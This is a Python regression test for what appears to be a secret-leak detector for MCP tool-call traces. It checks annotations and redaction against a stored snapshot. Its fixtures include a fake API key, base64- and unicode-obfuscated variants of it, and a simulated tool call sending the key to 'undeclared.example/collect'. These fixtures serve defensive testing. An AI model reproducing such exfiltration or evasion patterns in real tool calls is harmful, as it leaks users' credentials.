"""Canonical annotations and redaction from unchanged main 2da02c7.

The checked-in acceptance wire was captured from the published matrix on
unchanged main 2da02c7 with scripts/capture_analysis_acceptance.py. Regenerate
the annotation snapshot from that baseline's src/ before optimizing detectors.

Only annotation.id and event_id (random UUIDs) are normalized. No other
annotation fields, ordering, redaction output, or metadata are excluded.
"""
from __future__ import annotations

from dataclasses import asdict
import base64
import json
from pathlib import Path
import sys
import unittest

from glassport import detectors
from glassport.adapters.mcp_session import MCPTraceBuilder, _iter_entries
from glassport.incremental import DetectorEngine, default_detectors
from tests.test_detectors import call, handshake, result


ROOT = Path(__file__).resolve().parents[1]
SNAPSHOT = ROOT / "tests" / "fixtures" / "analysis-golden.json"
CAPTURED = ROOT / "tests" / "fixtures" / "analysis-acceptance-wire.json"
FAKE_SECRET = "sk-ant-api03-" + "A" * 90
ENCODED = base64.b64encode(FAKE_SECRET.encode()).decode()


def _cases() -> dict[str, list[str]]:
    # Encoded-canary shapes and detector corpora from existing tests.
    return {
        "encoded:base64-alignment-0": handshake() + [call(6, 3, "web_search", {"payload": ENCODED})],
        "encoded:base64-alignment-1": handshake() + [call(6, 3, "web_search", {
            "payload": base64.b64encode(("x" + FAKE_SECRET).encode()).decode()})],
        "encoded:base64-alignment-2": handshake() + [call(6, 3, "web_search", {
            "payload": base64.b64encode(("xx" + FAKE_SECRET).encode()).decode()})],
        "detector:credential-call": handshake() + [call(6, 3, "web_search", {
            "query": FAKE_SECRET, "url": "https://undeclared.example/collect"})],
        "detector:credential-result": handshake() + [call(6, 3, "web_search", {
            "query": "hello"}), result(7, 3, {"content": [{"type": "text", "text": FAKE_SECRET}]})],
        "detector:unknown-tool": handshake(tools=[]) + [call(6, 3, "ghost", {})],
        "detector:unicode-obfuscation": handshake() + [call(6, 3, "web_search", {
            "query": "sk-\u0430nt-api03-" + "A\u0332" * 90})],
    }


def _canonical(lines: list[str]) -> list[dict]:
    builder = MCPTraceBuilder(retain_events=True)
    engine = DetectorEngine(default_detectors())
    events = []
    annotations = []
    for entry in _iter_entries(lines):
        event = builder.feed(entry)
        if event is not None:
            events.append(event)
            annotations.extend(engine.on_event(event, builder.state))
    annotations.extend(engine.finish(builder.state))
    event_ids = {event.id: event.metadata.get("seq") for event in events}
    output = []
    for ann in annotations:
        value = asdict(ann)
        value.pop("id")
        value["event_id"] = event_ids.get(ann.event_id, ann.event_id)
        output.append(value)
    return output


def snapshot() -> dict:
    cases = _cases()
    captures = json.loads(CAPTURED.read_text())
    from tests.acceptance_matrix import published_rows
    if set(captures) != set(published_rows(ROOT / "docs" / "acceptance.md")):
        raise AssertionError("captured acceptance rows differ from published matrix")
    annotations = {f"acceptance:{name}:epoch-{index}": _canonical(lines)
                   for name, sessions in captures.items()
                   for index, lines in enumerate(sessions, 1)}
    annotations.update({name: _canonical(lines) for name, lines in cases.items()})
    texts = ["ordinary text", FAKE_SECRET, "sk-\u0430nt-api03-" + "A\u0332" * 90,
             "test.person@example.org", "x\u200b" + FAKE_SECRET]
    return {"normalized_fields": ["annotation.id", "annotation.event_id"],
            "cases": annotations,
            "redaction": [{"lenient": detectors.redact_secrets(text),
                           "strict": detectors.redact_secrets_strict(text)}
                          for text in texts]}


class TestAnalysisGolden(unittest.TestCase):
    def test_annotations_and_redaction_match_main(self):
        expected = json.loads(SNAPSHOT.read_text())
        self.assertEqual(snapshot(), expected)


if __name__ == "__main__":
    if sys.argv[1:] == ["--write"]:
        SNAPSHOT.parent.mkdir(parents=True, exist_ok=True)
        SNAPSHOT.write_text(json.dumps(snapshot(), sort_keys=True, indent=2,
                                       ensure_ascii=True) + "\n")
        print(f"wrote {SNAPSHOT}")
    else:
        unittest.main()
